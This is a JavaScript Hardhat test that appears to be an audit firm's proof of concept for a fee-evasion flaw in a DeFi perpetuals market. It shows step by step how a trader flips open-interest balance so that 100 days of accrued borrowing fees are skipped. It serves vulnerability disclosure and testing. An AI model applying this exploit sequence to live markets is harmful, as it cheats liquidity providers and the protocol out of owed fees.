import { expect } from "chai";
import { time } from "@nomicfoundation/hardhat-network-helpers";

import { deployFixture } from "../../utils/fixture";
import { expandDecimals, decimalToFloat } from "../../utils/math";
import { handleDeposit } from "../../utils/deposit";
import { OrderType, handleOrder } from "../../utils/order";
import * as keys from "../../utils/keys";
import {prices} from "../../utils/prices";
import { expectWithinRange } from "../../utils/validation";
import { getPositionCount, getAccountPositionCount, getPositionKeys } from "../../utils/position";
import { getEventData } from "../../utils/event";


describe("Guardian.POC", () => {
    let fixture;
    let wallet, user0, user1;
    let roleStore, dataStore, wnt, usdc, ethUsdMarket, reader, referralStorage;

    beforeEach(async () => {
        fixture = await deployFixture();
        ({ wallet, user0, user1 } = fixture.accounts);
        ({ roleStore, dataStore, ethUsdMarket, wnt, usdc, reader, referralStorage } = fixture.contracts);

        await handleDeposit(fixture, {
            create: {
                market: ethUsdMarket,
                longTokenAmount: expandDecimals(1000, 18),
                shortTokenAmount: expandDecimals(1000 * 5_000, 6),
            },
            execute: {
                precisions: [8, 18],
                tokens: [wnt.address, usdc.address],
                minPrices: [expandDecimals(5000, 4), expandDecimals(1, 6)],
                maxPrices: [expandDecimals(5000, 4), expandDecimals(1, 6)],
            }
        });
    });

    it.only("Borrowing fees can be skipped by manipulating OI", async () => {
        await dataStore.setUint(keys.borrowingFactorKey(ethUsdMarket.marketToken, true), decimalToFloat(1, 7));
        await dataStore.setUint(keys.borrowingFactorKey(ethUsdMarket.marketToken, false), decimalToFloat(2, 7));
        await dataStore.setUint(keys.borrowingExponentFactorKey(ethUsdMarket.marketToken, true), decimalToFloat(1));
        await dataStore.setUint(keys.borrowingExponentFactorKey(ethUsdMarket.marketToken, false), decimalToFloat(1));
        await dataStore.setUint(keys.BORROWING_FEE_RECEIVER_FACTOR, decimalToFloat(4, 1)); // 40%
        const skipKey = keys.SKIP_BORROWING_FEE_FOR_SMALLER_SIDE;
        await dataStore.setBool(skipKey, true);
        expect(await dataStore.getUint(keys.cumulativeBorrowingFactorUpdatedAtKey(ethUsdMarket.marketToken, true))).eq(0);

        // User0 MarketIncrease long position with short collateral for $50K
        await handleOrder(fixture, {
            create: {
                account: user0,
                market: ethUsdMarket,
                initialCollateralToken: usdc,
                initialCollateralDeltaAmount: expandDecimals(50 * 1000, 6), // $50,000
                swapPath: [],
                sizeDeltaUsd: decimalToFloat(50 * 1000), // $50,000 Position
                acceptablePrice: expandDecimals(5000, 12),
                executionFee: expandDecimals(1, 15),
                minOutputAmount: 0,
                orderType: OrderType.MarketIncrease,
                isLong: true,
                shouldUnwrapNativeToken: false,
            },
        });

        // User1 MarketIncrease short position with short collateral for $200K
        await handleOrder(fixture, {
            create: {
                account: user1,
                market: ethUsdMarket,
                initialCollateralToken: usdc,
                initialCollateralDeltaAmount: expandDecimals(100 * 1000, 6), // $100,000
                swapPath: [],
                sizeDeltaUsd: decimalToFloat(200 * 1000), // $200.000 Position
                acceptablePrice: expandDecimals(5000, 12),
                executionFee: expandDecimals(1, 15),
                minOutputAmount: 0,
                orderType: OrderType.MarketIncrease,
                isLong: false,
                shouldUnwrapNativeToken: false,
            },
        });


        // Check that everyone has a position open
        expect(await getAccountPositionCount(dataStore, user0.address)).eq(1);
        expect(await getAccountPositionCount(dataStore, user1.address)).eq(1);
        expect(await getPositionCount(dataStore)).eq(2);

        // 100 days later
        await time.increase(100 * 24 * 60 * 60);
        const positionKeys = await getPositionKeys(dataStore, 0, 10);

        // Check that User0's position haven't accumulated borrowing fees
        const position0 = await reader.getPositionInfo(
            dataStore.address,
            referralStorage.address,
            positionKeys[0],
            prices.ethUsdMarket,
            0,
            ethers.constants.AddressZero,
            true
        );
        expect(position0.fees.borrowing.borrowingFeeUsd).eq(
            "0"
        );

        // Check that User1's position has accumulated borrowing fees
        const position1 = await reader.getPositionInfo(
            dataStore.address,
            referralStorage.address,
            positionKeys[1],
            prices.ethUsdMarket,
            0,
            ethers.constants.AddressZero,
            true
        );
        expect(position1.fees.borrowing.borrowingFeeUsd).eq(
            "13824000000000000000000000000000000"
        );

        // User1 create another position to flip the larger size so that user1 can avoid paying the accumulated borrowing fees on the first position
        await handleOrder(fixture, {
            create: {
                account: user1,
                market: ethUsdMarket,
                initialCollateralToken: usdc,
                initialCollateralDeltaAmount: expandDecimals(800 * 1000, 6),
                swapPath: [],
                sizeDeltaUsd: decimalToFloat(300 * 1000),
                acceptablePrice: expandDecimals(5000, 12),
                executionFee: expandDecimals(1, 15),
                minOutputAmount: 0,
                orderType: OrderType.MarketIncrease,
                isLong: true,
                shouldUnwrapNativeToken: false,
            },
        });

        // User0 MarketDecrease for the whole position size
        await handleOrder(fixture, {
            create: {
                account: user0,
                market: ethUsdMarket,
                initialCollateralToken: usdc,
                initialCollateralDeltaAmount: expandDecimals(50 * 1000, 6), // $50,000
                swapPath: [],
                sizeDeltaUsd: decimalToFloat(50 * 1000), // 2x Position
                acceptablePrice: expandDecimals(5000, 12),
                executionFee: expandDecimals(1, 15),
                minOutputAmount: 0,
                orderType: OrderType.MarketDecrease,
                isLong: true,
                shouldUnwrapNativeToken: false,
            },      execute: {
                afterExecution: ({ logs }) => {
                    const positionFeesCollectedEvent = getEventData(logs, "PositionFeesCollected");
                    expectWithinRange(positionFeesCollectedEvent.borrowingFeeAmount, "1728001365", "1728001366");
                    expect(positionFeesCollectedEvent.borrowingFeeReceiverFactor).eq(decimalToFloat(4, 1));
                    expectWithinRange(positionFeesCollectedEvent.borrowingFeeAmountForFeeReceiver,
                        "419",
                        "420"
                    );
                },
            },
        });

        // Check that User0 paid a small amount of borrowing fees
        expect(await usdc.balanceOf(user0.address)).eq("49999998950")

        // User1 MarketDecrease for the whole position size
        await handleOrder(fixture, {
            create: {
                account: user1,
                market: ethUsdMarket,
                initialCollateralToken: usdc,
                initialCollateralDeltaAmount: expandDecimals(100 * 1000, 6), // $50,000
                swapPath: [],
                sizeDeltaUsd: decimalToFloat(200 * 1000), // 2x Position
                acceptablePrice: expandDecimals(5000, 12),
                executionFee: expandDecimals(1, 15),
                minOutputAmount: 0,
                orderType: OrderType.MarketDecrease,
                isLong: false,
                shouldUnwrapNativeToken: false,
            },      execute: {
                afterExecution: ({ logs }) => {
                    const positionFeesCollectedEvent = getEventData(logs, "PositionFeesCollected");
                    expectWithinRange(positionFeesCollectedEvent.borrowingFeeAmount, "0", "1");
                    expect(positionFeesCollectedEvent.borrowingFeeReceiverFactor).eq(decimalToFloat(4, 1));
                    expectWithinRange(positionFeesCollectedEvent.borrowingFeeAmountForFeeReceiver,
                        "0",
                        "1"
                    );
                },
            },
        });

        // Check that User1 didn't pay any borrowing fees
        expect(await usdc.balanceOf(user1.address)).eq("100000000000")
    });
});
